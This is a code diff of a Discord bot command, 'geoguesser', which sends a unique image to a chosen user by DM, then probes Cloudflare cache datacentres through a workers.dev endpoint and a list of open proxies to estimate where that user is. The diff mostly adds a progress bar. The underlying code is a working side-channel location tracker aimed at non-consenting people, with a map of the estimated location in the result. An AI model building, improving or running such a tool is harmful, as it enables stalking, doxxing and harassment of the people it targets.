@@ -3,7 +3,7 @@ geoguesser.py – !geoguesser <@user>
 Generates a unique random image, sends it to a target user,
 pre‑caches it, then uses Cloudflare cache enumeration
 from the ORD worker AND internal proxy scanner to estimate location.
-Public command – anyone can use it.
+Shows a live progress bar while working.
 """
 
 import asyncio
@@ -18,11 +18,10 @@ import math
 import traceback
 
 # ============ CONFIGURATION ============
-WORKER_ORD = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"   # Original (ORD)
+WORKER_ORD = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
 WAIT_SECONDS = 25
 # =======================================
 
-# Cloudflare colo coordinates
 COLO_COORDS = {
     'EWR': {'lat': 40.6895, 'lon': -74.1745, 'name': 'Newark, NJ'},
     'IAD': {'lat': 38.9531, 'lon': -77.4475, 'name': 'Washington DC'},
@@ -46,7 +45,7 @@ COLO_COORDS = {
     'HOU': {'lat': 29.7604, 'lon': -95.3698, 'name': 'Houston, TX'},
 }
 
-# Curated list of HTTPS‑capable proxies (taken from your earlier list)
+# Curated list of HTTPS‑capable proxies
 PROXY_LIST = [
     "212.113.104.29:10801","213.176.113.24:50001","43.167.173.109:8080","139.99.95.120:8080",
     "79.137.78.133:8002","64.188.77.26:3128","147.45.60.252:1081","79.133.180.232:10808",
@@ -113,7 +112,7 @@ async def safe_send_embed(channel, embed):
 async def scan_via_proxies(image_url):
     """
     Use the internal proxy list to probe the image URL from different locations.
-    Returns a dict with the same structure as the worker: { url, checked, hits, datacenters, full_results }.
+    Returns a dict with the same structure as the worker.
     Never raises an exception; returns partial/empty data on failure.
     """
     results = []
@@ -169,28 +168,52 @@ async def run(client, message, args):
         await message.channel.send("❌ Invalid user ID or mention.")
         return
 
-    # We'll try to keep a status message, but if it fails we ignore
+    # Progress bar settings
+    steps = [
+        "Generate unique image",
+        "Upload to Discord CDN",
+        "Send image to target",
+        f"Wait {WAIT_SECONDS}s for cache",
+        "Enumerate cache (ORD worker + proxies)"
+    ]
+    total_steps = len(steps)
+    bar_length = 12  # length of the progress bar in characters
     status_msg = None
-    try:
-        status_msg = await message.channel.send("🖼️ Generating unique image...")
-    except Exception:
-        pass
 
-    async def _update_status(text):
-        if status_msg is None:
-            return
+    async def _update_progress(current_step, extra_lines=None):
+        nonlocal status_msg
+        filled = int((current_step / total_steps) * bar_length)
+        bar = "▓" * filled + "░" * (bar_length - filled)
+        progress_text = f"Progress: [{bar}] {current_step}/{total_steps}\n"
+        # Add completed steps with checkmark
+        for i, step in enumerate(steps[:current_step]):
+            progress_text += f"✅ {step}\n"
+        # Add current step with hourglass
+        if current_step < total_steps:
+            progress_text += f"⏳ {steps[current_step]}\n"
+        # Add any extra information (like error messages or sub-steps)
+        if extra_lines:
+            for line in extra_lines:
+                progress_text += f"{line}\n"
         try:
-            await status_msg.edit(content=text)
+            if status_msg is None:
+                status_msg = await message.channel.send(progress_text)
+            else:
+                await status_msg.edit(content=progress_text)
         except discord.NotFound:
-            # Message was deleted; we can try to send a new one but it's okay to just ignore
-            pass
+            # If old message vanished, send a new one
+            status_msg = await message.channel.send(progress_text)
         except Exception:
-            pass
+            pass  # never crash on progress update failure
 
     try:
+        # Step 1: Generate image
+        await _update_progress(0)
         img_bytes = generate_random_image()
+        await _update_progress(1)
 
-        await _update_status("📤 Uploading to Discord CDN...")
+        # Step 2: Upload to CDN
+        image_url = None
         try:
             sent = await message.channel.send(file=discord.File(img_bytes, filename="geo.png"))
             if not sent.attachments:
@@ -202,12 +225,12 @@ async def run(client, message, args):
                 await sent.delete()
             except Exception:
                 pass
+            await _update_progress(2)
         except Exception as e:
             await message.channel.send(f"❌ Failed to upload image: {e}")
             return
 
-        # Pre-cache (optional)
-        await _update_status("🌐 Pre-caching image on global CDN...")
+        # Pre-cache (optional, not a main step)
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(image_url, timeout=10) as resp:
@@ -216,10 +239,12 @@ async def run(client, message, args):
         except Exception:
             pass
 
-        await _update_status(f"📨 Sending image to {target.name}...")
+        # Step 3: DM the image
+        await _update_progress(2, extra_lines=["📤 Sending DM..."])  # still step 2 because we finished it; we'll update to step 3 after
         img_bytes.seek(0)
         try:
             await target.send(file=discord.File(img_bytes, filename="geo.png"))
+            await _update_progress(3)
         except discord.Forbidden:
             await message.channel.send("❌ Cannot DM that user (DMs closed).")
             return
@@ -227,12 +252,12 @@ async def run(client, message, args):
             await message.channel.send(f"❌ DM failed: {e}")
             return
 
-        await _update_status(f"⏳ Waiting {WAIT_SECONDS}s for cache & notifications...")
+        # Step 4: Wait
+        await _update_progress(3, extra_lines=[f"⏳ Waiting {WAIT_SECONDS} seconds..."])
         await asyncio.sleep(WAIT_SECONDS)
+        await _update_progress(4)
 
-        await _update_status("🔍 Enumerating Cloudflare cache (ORD worker + proxy scanner)...")
-
-        # Fetch from both sources in parallel
+        # Step 5: Enumerate cache (both sources)
         api_ord = f"{WORKER_ORD}?url={image_url}"
 
         async def fetch_ord():
@@ -244,17 +269,18 @@ async def run(client, message, args):
             except Exception:
                 return None
 
+        # Start both scans concurrently
         data_ord, data_proxy = await asyncio.gather(
             fetch_ord(),
             scan_via_proxies(image_url)
         )
+        await _update_progress(4, extra_lines=["🔍 Cache scan complete."])
 
-        # Merge results
+        # Merge results (same as before)
         datacenters = []
         hits = 0
         checked = 0
         full_results = []
-
         for data in [data_ord, data_proxy]:
             if data:
                 dcs = data.get('datacenters', [])
@@ -265,12 +291,10 @@ async def run(client, message, args):
                 checked += data.get('checked', 0)
                 full_results.extend(data.get('full_results', []))
 
-        # Build raw JSON for display
         raw_json = json.dumps({"datacenters": datacenters, "full_results": full_results}, indent=2)
         if len(raw_json) > 1000:
             raw_json = raw_json[:1000] + "\n... (truncated)"
 
-        # Scanned colos summary
         probed_colos = []
         seen = set()
         for r in full_results:
@@ -291,7 +315,6 @@ async def run(client, message, args):
             f"**Estimated radius:** ~"
         )
 
-        # No hits case
         if not datacenters:
             embed = discord.Embed(
                 title="📍 GeoGuesser – No Cache Hits",
@@ -302,12 +325,6 @@ async def run(client, message, args):
             embed.add_field(name="🔬 Scanned Colos", value=colos_text, inline=False)
             embed.add_field(name="📄 Raw Merged Data", value=f"```json\n{raw_json}\n```", inline=False)
             embed.set_footer(text="No cache entry found. Target may not have downloaded the image.")
-            # Clean up status
-            if status_msg:
-                try:
-                    await status_msg.delete()
-                except Exception:
-                    pass
             await safe_send_embed(message.channel, embed)
             return
 
@@ -330,11 +347,6 @@ async def run(client, message, args):
             embed.add_field(name="🌐 HIT Datacenters", value=", ".join(datacenters), inline=False)
             embed.add_field(name="🔬 Scanned Colos", value=colos_text, inline=False)
             embed.add_field(name="📄 Raw Merged Data", value=f"```json\n{raw_json}\n```", inline=False)
-            if status_msg:
-                try:
-                    await status_msg.delete()
-                except Exception:
-                    pass
             await safe_send_embed(message.channel, embed)
             return
 
@@ -364,12 +376,8 @@ async def run(client, message, args):
         embed.set_footer(text="Powered by Cloudflare Cache Enumeration (dual‑source)")
         embed.set_image(url=map_url)
 
-        if status_msg:
-            try:
-                await status_msg.delete()
-            except Exception:
-                pass
-
+        # Final update: show "Done" on progress bar, then send the embed
+        await _update_progress(total_steps, extra_lines=["✅ All done. See results below."])
         await safe_send_embed(message.channel, embed)
 
     except Exception as e:
